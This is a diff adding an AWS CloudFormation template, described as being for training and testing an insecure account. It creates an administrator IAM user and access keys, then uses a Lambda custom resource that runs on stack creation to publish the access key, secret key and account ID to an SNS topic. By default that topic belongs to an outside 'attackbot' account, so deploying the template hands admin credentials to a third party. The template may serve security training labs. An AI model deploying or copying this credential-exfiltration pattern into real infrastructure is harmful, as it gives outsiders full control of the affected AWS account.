@@ -1,0 +1,111 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Description: Template to build out users for insecure account this is only used for training and testing.
+Parameters:
+  SNSReceiverArn:
+    Type: String
+    Description: The ARN of the SNS topic to post credentials to.  Note that this leaks credentials.
+    Default: arn:aws:sns:us-west-2:671642278147:attackbot-AttackBotTopic-1MC5V50V7WLWI
+Resources:
+  IAMUser1:
+    Type: AWS::IAM::User
+    Properties:
+      Path: /
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AdministratorAccess
+  IAMUser1Keys:
+    Type: AWS::IAM::AccessKey
+    Properties:
+      UserName: !Ref 'IAMUser1'
+  SNSEmission:
+    Type: AWS::Lambda::Function
+    DependsOn: IAMUser1Keys
+    Properties:
+      Code:
+        ZipFile: |
+          import base64
+          import json
+          import logging
+          import string
+          import random
+          import boto3
+          from botocore.vendored import requests
+          import cfnresponse
+
+          logger = logging.getLogger()
+          logger.setLevel(logging.INFO)
+
+          def lambda_handler(event, context):
+            responseData = {}
+
+            if event['RequestType'] == 'Create':
+              try:
+                sns = boto3.client('sns', region_name='us-west-2')
+                result = sns.publish(
+                  TopicArn=event['ResourceProperties']['SNSTopic'],
+                  Message=json.dumps(
+                    dict(
+                      AccessKey=event['ResourceProperties']['AccessKey'],
+                      SecretKey=event['ResourceProperties']['SecretAccessKey'],
+                      AccountId=event['ResourceProperties']['AccountID']
+                    )
+                  )
+                )
+                logger.info(result)
+              except Exception as e:
+                logger.error("Could not publish due to: {}".format(e))
+
+            else: # delete / update
+              pass
+            cfnresponse.send(event, context, cfnresponse.SUCCESS, responseData, responseData)
+      Handler: "index.lambda_handler"
+      Timeout: 30
+      Role: !GetAtt 'LambdaRole.Arn'
+      Runtime: python3.6
+  LambdaRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          -
+            Effect: Allow
+            Principal:
+              Service:
+                - lambda.amazonaws.com
+            Action:
+              - sts:AssumeRole
+      Path: /
+      Policies:
+        - PolicyName: "lambda-logs"
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Effect: Allow
+                Action:
+                  - logs:CreateLogGroup
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource:
+                  - "arn:aws:logs:*:*:*"
+        - PolicyName: "sns-publish"
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Effect: Allow
+                Action:
+                  - sns:Publish
+                Resource:
+                  - !Ref SNSReceiverArn
+  ToSNSCustom:
+    Type: 'Custom::SNSEmission'
+    Version: '1.0'
+    Properties:
+      ServiceToken: !GetAtt SNSEmission.Arn
+      SNSTopic: !Ref SNSReceiverArn
+      AccessKey: !Ref 'IAMUser1Keys'
+      SecretAccessKey: !GetAtt 'IAMUser1Keys.SecretAccessKey'
+      AccountID: !Ref 'AWS::AccountId'
+Outputs:
+  AccessKey:
+    Description: AccessKey
+    Value: !Ref 'IAMUser1Keys'
